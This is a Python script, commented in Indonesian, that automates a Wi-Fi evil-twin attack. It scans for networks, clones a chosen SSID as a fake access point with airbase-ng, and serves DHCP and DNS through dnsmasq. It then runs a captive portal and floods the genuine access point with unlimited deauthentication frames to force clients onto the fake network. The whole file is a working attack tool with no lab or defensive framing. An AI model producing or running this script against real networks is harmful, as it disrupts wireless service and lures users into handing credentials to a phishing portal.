import os
import subprocess
import time
import signal
import sys
import re

# --- Konfigurasi ---
IFACE = "wlan0"
MON_IFACE = f"{IFACE}mon"
AP_IP = "192.168.10.1"
AP_NETMASK = "255.255.255.0"
DNSMASQ_CONF = "dnsmasq.conf"
CAPTIVE_PORTAL_SCRIPT = "server.js"

# Daftar untuk menyimpan semua proses yang berjalan di latar belakang
background_processes = []

def cleanup():
    """Menghentikan semua proses latar belakang dan membersihkan antarmuka."""
    print("\n[!] Membersihkan dan menghentikan semua layanan...")

    # Hentikan semua proses anak yang telah kita mulai
    for proc in background_processes:
        try:
            # Menggunakan os.killpg untuk menghentikan seluruh grup proses
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except ProcessLookupError:
            pass  # Proses mungkin sudah berhenti

    # Tunggu sebentar agar proses benar-benar berhenti
    time.sleep(2)

    print("[+] Menghentikan mode monitor...")
    run_command(f"sudo airmon-ng stop {MON_IFACE}", check=False)

    print("[+] Mengembalikan konfigurasi jaringan...")
    run_command("sudo systemctl enable systemd-resolved", check=False)
    run_command("sudo systemctl start systemd-resolved", check=False)
    
    # Flush iptables rules jika ada
    run_command("sudo iptables --flush", check=False)
    run_command("sudo iptables --table nat --flush", check=False)
    
    print("[+] Pembersihan selesai. Keluar.")
    sys.exit(0)

def signal_handler(sig, frame):
    """Menangani sinyal interupsi (Ctrl+C)."""
    cleanup()

def check_root():
    """Memeriksa apakah skrip dijalankan sebagai root."""
    if os.geteuid() != 0:
        print("[!] Kesalahan: Skrip ini harus dijalankan sebagai root (gunakan sudo).")
        sys.exit(1)

def run_command(command, check=True):
    """Menjalankan perintah sinkron dan menunggu hingga selesai."""
    try:
        # Menggunakan list untuk keamanan, bukan string tunggal
        subprocess.run(command.split(), check=check, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Perintah gagal: {' '.join(e.cmd)}")
        print(f"    Stderr: {e.stderr.strip()}")
        cleanup() # Jika perintah penting gagal, bersihkan dan keluar
    except FileNotFoundError:
        print(f"[!] Perintah tidak ditemukan: {command.split()[0]}. Pastikan program tersebut terinstal.")
        sys.exit(1)

def start_background_process(command_list):
    """Memulai proses di latar belakang dan menyimpannya untuk dibersihkan nanti."""
    # preexec_fn=os.setsid diperlukan untuk membunuh proses dan semua anaknya nanti
    proc = subprocess.Popen(command_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    background_processes.append(proc)
    print(f"[+] Proses '{command_list[1]}' dimulai dengan PID: {proc.pid}")
    return proc

def main():
    check_root()
    
    # Menyiapkan signal handler untuk menangani Ctrl+C dengan benar
    signal.signal(signal.SIGINT, signal_handler)

    try:
        # --- Tahap 1: Setup Awal & Scan ---
        print("[+] Memulai mode monitor...")
        run_command(f"sudo airmon-ng start {IFACE}")

        print("\n[+] Memulai scan jaringan. Tekan Ctrl+C untuk berhenti scan dan memilih target.")
        try:
            # airodump-ng akan dihentikan oleh KeyboardInterrupt
            subprocess.run(["sudo", "airodump-ng", MON_IFACE])
        except KeyboardInterrupt:
            print("\n[+] Scan dihentikan.")
        except Exception:
            print("[!] Gagal menjalankan airodump-ng. Pastikan aircrack-ng terinstal.")
            cleanup()

        # --- Tahap 2: Mendapatkan Input Target ---
        bssid = input("Masukkan BSSID target: ").strip()
        while not re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", bssid):
            print("[!] Format BSSID tidak valid. Contoh: 00:1A:2B:3C:4D:5E")
            bssid = input("Masukkan BSSID target: ").strip()

        channel = input("Masukkan channel target: ").strip()
        while not channel.isdigit() or not (1 <= int(channel) <= 14):
            print("[!] Channel harus berupa angka antara 1 dan 14.")
            channel = input("Masukkan channel target: ").strip()
            
        ssid = input("Masukkan SSID target (nama WiFi): ").strip()

        # --- Tahap 3: Membuat Fake AP & Konfigurasi Jaringan ---
        print("\n[+] Membuat Fake Access Point (AP)...")
        start_background_process(["sudo", "airbase-ng", "-e", ssid, "-c", channel, MON_IFACE])
        time.sleep(5) # Beri waktu agar antarmuka at0 dibuat

        print("[+] Mengonfigurasi jaringan untuk Fake AP (at0)...")
        run_command(f"sudo ifconfig at0 {AP_IP} netmask {AP_NETMASK} up")
        
        print("[+] Menghentikan service yang konflik...")
        run_command("sudo systemctl stop systemd-resolved", check=False)
        
        print("[+] Menjalankan server DHCP & DNS (dnsmasq)...")
        start_background_process(["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"])
        
        # --- Tahap 4: Menjalankan Layanan Pendukung ---
        print("[+] Menjalankan Captive Portal...")
        start_background_process(["sudo", "node", CAPTIVE_PORTAL_SCRIPT])
        
        print("[+] Menjalankan Deauthentication Attack untuk mengarahkan klien...")
        start_background_process(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, MON_IFACE])

        print("\n[+] Semua layanan berjalan. Captive portal aktif.")
        print("[+] Tekan Ctrl+C untuk menghentikan semua serangan dan membersihkan.")
        
        # Skrip akan diam di sini sampai Ctrl+C ditekan
        while True:
            time.sleep(1)

    except Exception as e:
        print(f"\n[!] Terjadi kesalahan tak terduga: {e}")
    finally:
        # Blok finally akan selalu dieksekusi, memastikan pembersihan terjadi
        cleanup()

if __name__ == "__main__":
    main()
